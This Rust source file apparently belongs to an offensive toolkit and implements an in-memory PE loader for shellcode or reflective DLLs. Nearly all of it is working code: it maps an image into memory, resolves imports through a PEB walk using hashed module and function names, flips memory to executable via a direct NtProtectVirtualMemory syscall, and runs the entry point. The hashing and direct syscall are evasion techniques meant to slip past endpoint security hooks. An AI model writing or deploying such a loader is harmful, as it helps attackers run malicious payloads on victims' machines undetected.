//! loader.rs — in-memory PE loader (shellcode / reflective DLL)
//!
//! load_pe(buf) maps a PE image into an executable allocation,
//! applies relocations, resolves imports via PEB walk, then
//! calls the entry point.

#![allow(dead_code, non_snake_case)]

use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    IMAGE_SECTION_HEADER, IMAGE_IMPORT_DESCRIPTOR,
    IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_DIRECTORY_ENTRY_IMPORT,
};
use winapi::shared::minwindef::FARPROC;

use crate::syscall::do_syscall;

const CURRENT_PROCESS: usize = usize::MAX; // NtCurrentProcess() pseudo-handle

/// Load a PE image from `buf` and execute its entry point.
/// Returns true on success.
pub unsafe fn load_pe(buf: &[u8]) -> bool {
    if buf.len() < core::mem::size_of::<IMAGE_DOS_HEADER>() { return false; }

    let dos = buf.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D { return false; }  // MZ

    let nt_off  = (*dos).e_lfanew as usize;
    let nt      = buf.as_ptr().add(nt_off) as *const IMAGE_NT_HEADERS64;
    let opt     = &(*nt).OptionalHeader;
    let img_sz  = opt.SizeOfImage as usize;
    let hdr_sz  = opt.SizeOfHeaders as usize;

    // ------------------------------------------------------------------
    // 1. Allocate memory for the image.
    // ------------------------------------------------------------------
    let base = VirtualAlloc(
        core::ptr::null_mut(),
        img_sz,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut u8;
    if base.is_null() { return false; }

    // Copy headers.
    core::ptr::copy_nonoverlapping(buf.as_ptr(), base, hdr_sz);

    // ------------------------------------------------------------------
    // 2. Copy sections.
    // ------------------------------------------------------------------
    let n_sections = (*nt).FileHeader.NumberOfSections as usize;
    let sec_ptr = (nt as *const u8)
        .add(4 + core::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
               + (*nt).FileHeader.SizeOfOptionalHeader as usize)
        as *const IMAGE_SECTION_HEADER;

    for i in 0..n_sections {
        let sec = &*sec_ptr.add(i);
        let raw_off  = sec.PointerToRawData as usize;
        let raw_sz   = sec.SizeOfRawData   as usize;
        let virt_off = sec.VirtualAddress  as usize;
        if raw_sz == 0 { continue; }
        core::ptr::copy_nonoverlapping(
            buf.as_ptr().add(raw_off),
            base.add(virt_off),
            raw_sz,
        );
    }

    // ------------------------------------------------------------------
    // 3. Base relocations.
    // ------------------------------------------------------------------
    let reloc_rva = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize;
    if reloc_rva != 0 {
        let delta = base as isize - opt.ImageBase as isize;
        let mut reloc = base.add(reloc_rva) as *const IMAGE_BASE_RELOCATION;
        loop {
            let block_size = (*reloc).SizeOfBlock as usize;
            if block_size < core::mem::size_of::<IMAGE_BASE_RELOCATION>() { break; }
            let page_rva   = (*reloc).VirtualAddress as usize;
            let n_entries  = (block_size - core::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
            let entries    = (reloc as *const u8)
                .add(core::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
            for j in 0..n_entries {
                let entry = *entries.add(j);
                let t = entry >> 12;
                if t == 0xA {  // IMAGE_REL_BASED_DIR64
                    let offset = (entry & 0xFFF) as usize;
                    let patch  = base.add(page_rva + offset) as *mut isize;
                    *patch = patch.read_unaligned().wrapping_add(delta);
                }
            }
            reloc = (reloc as *const u8).add(block_size) as *const IMAGE_BASE_RELOCATION;
        }
    }

    // ------------------------------------------------------------------
    // 4. Import resolution.
    // ------------------------------------------------------------------
    let imp_rva = opt.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize;
    if imp_rva != 0 {
        let mut desc = base.add(imp_rva) as *const IMAGE_IMPORT_DESCRIPTOR;
        loop {
            if (*desc).Name == 0 { break; }
            let mod_name = base.add((*desc).Name as usize) as *const u8;
            let mut mh: u32 = 5381;
            let mut k = 0;
            loop {
                let b = *mod_name.add(k);
                if b == 0 { break; }
                let lc = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
                mh = mh.wrapping_mul(33).wrapping_add(lc as u32);
                k += 1;
            }

            let thunk_rva  = *(*desc).u.OriginalFirstThunk() as usize;
            let iat_rva    = (*desc).FirstThunk as usize;
            let mut i_off  = 0usize;
            loop {
                let orig = *(base.add(thunk_rva + i_off) as *const usize);
                if orig == 0 { break; }
                let fn_name_ptr = base.add((orig & !0x8000_0000_0000_0000) as usize + 2) as *const u8;
                let mut fh: u32 = 5381;
                let mut m = 0;
                loop {
                    let b = *fn_name_ptr.add(m);
                    if b == 0 { break; }
                    fh = fh.wrapping_mul(33).wrapping_add(b as u32);
                    m += 1;
                }
                let proc = crate::syscall::get_proc_from_peb(mh, fh)
                    .unwrap_or(core::ptr::null()) as usize;
                let iat_slot = base.add(iat_rva + i_off) as *mut usize;
                *iat_slot = proc;
                i_off += 8;
            }
            desc = desc.add(1);
        }
    }

    // ------------------------------------------------------------------
    // 5. Mark image executable via NtProtectVirtualMemory.
    // ------------------------------------------------------------------
    let ssn_prot = match crate::syscall::resolve_ssn("NtProtectVirtualMemory") {
        Some(s) => s,
        None    => return false,
    };
    let mut prot_base = base as usize;
    let mut prot_size = img_sz;
    let mut old_prot  = 0u32;
    do_syscall(
        ssn_prot,
        CURRENT_PROCESS,
        &mut prot_base as *mut usize as usize,
        &mut prot_size as *mut usize as usize,
        PAGE_EXECUTE_READ as usize,
        &mut old_prot as *mut u32 as usize,
        0,
    );

    // ------------------------------------------------------------------
    // 6. Call entry point.
    // ------------------------------------------------------------------
    let ep_rva = opt.AddressOfEntryPoint as usize;
    if ep_rva == 0 { return true; }
    let entry: unsafe extern "system" fn(usize, u32, usize) -> u32 =
        core::mem::transmute(base.add(ep_rva));
    entry(base as usize, 1, 0);
    true
}
